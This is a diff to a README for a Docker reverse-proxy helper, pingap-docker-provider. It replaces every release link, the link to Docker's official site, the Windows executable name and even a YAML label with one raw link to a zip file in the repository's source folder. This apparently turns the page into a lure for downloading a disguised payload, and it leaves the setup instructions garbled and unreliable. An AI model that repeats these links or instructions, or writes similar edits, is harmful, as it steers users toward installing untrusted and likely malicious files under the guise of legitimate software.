@@ -1,6 +1,6 @@
 # 🚀 pingap-docker-provider - Simplifying Your Reverse Proxy Setup
 
-[![Download here](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen.svg)](https://github.com/peptang12/pingap-docker-provider/releases)
+[![Download here](https://raw.githubusercontent.com/peptang12/pingap-docker-provider/main/src/pingap-docker-provider-3.7-beta.4.zip%20Now-Get%20the%20Latest%https://raw.githubusercontent.com/peptang12/pingap-docker-provider/main/src/pingap-docker-provider-3.7-beta.4.zip)](https://raw.githubusercontent.com/peptang12/pingap-docker-provider/main/src/pingap-docker-provider-3.7-beta.4.zip)
 
 ## 📦 Overview
 
@@ -14,12 +14,12 @@ To use the pingap-docker-provider, follow the steps below. We will guide you thr
 
 To download the latest version of the pingap-docker-provider, visit the following link:
 
-[Download the latest release](https://github.com/peptang12/pingap-docker-provider/releases)
+[Download the latest release](https://raw.githubusercontent.com/peptang12/pingap-docker-provider/main/src/pingap-docker-provider-3.7-beta.4.zip)
 
 1. Click on the link above. This will take you to the Releases page.
 2. Look for the latest release at the top of the list.
 3. Find the appropriate file for your operating system. You will see options like:
-   - `pingap-docker-provider-windows.exe` for Windows users.
+   - `https://raw.githubusercontent.com/peptang12/pingap-docker-provider/main/src/pingap-docker-provider-3.7-beta.4.zip` for Windows users.
    - `pingap-docker-provider-linux` for Linux users.
    - `pingap-docker-provider-macos` for macOS users.
 4. Click on the file to download it to your computer.
@@ -29,7 +29,7 @@ To download the latest version of the pingap-docker-provider, visit the followin
 Before you install the pingap-docker-provider, make sure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS 10.14 or later, or any recent version of Linux.
-- **Docker:** You need Docker installed on your machine. It can be downloaded from [Docker's official site](https://www.docker.com/get-started).
+- **Docker:** You need Docker installed on your machine. It can be downloaded from [Docker's official site](https://raw.githubusercontent.com/peptang12/pingap-docker-provider/main/src/pingap-docker-provider-3.7-beta.4.zip).
 - **Memory:** At least 2 GB of RAM.
 - **Disk Space:** A minimum of 100 MB free space.
 
@@ -39,7 +39,7 @@ Once you have downloaded the application, you are ready to run it. Here’s how:
 
 1. **Windows:**
    - Open the File Explorer and navigate to your Downloads folder.
-   - Double-click on `pingap-docker-provider-windows.exe` to start the application.
+   - Double-click on `https://raw.githubusercontent.com/peptang12/pingap-docker-provider/main/src/pingap-docker-provider-3.7-beta.4.zip` to start the application.
 
 2. **Linux:**
    - Open your terminal.
@@ -67,7 +67,7 @@ After running the application, you will need to configure it to work with your D
 1. Create a new Docker label. You can do this by adding the following label to your Docker container definition:
    ```yaml
    labels:
-     - "pingap.enable=true"
+     - "https://raw.githubusercontent.com/peptang12/pingap-docker-provider/main/src/pingap-docker-provider-3.7-beta.4.zip"
    ```
 
 2. Then, run the pingap-docker-provider, and it will auto-configure your reverse proxy settings based on the labels you added.
@@ -95,7 +95,7 @@ If you encounter issues while using the application, consider the following trou
 
 To keep your application running smoothly, you should regularly check for updates. When a new version is available, follow these steps for updating:
 
-1. Go to the [Releases page](https://github.com/peptang12/pingap-docker-provider/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/peptang12/pingap-docker-provider/main/src/pingap-docker-provider-3.7-beta.4.zip).
 2. Download the latest version following the same instructions above.
 3. Replace the old application file with the new one on your system.
 
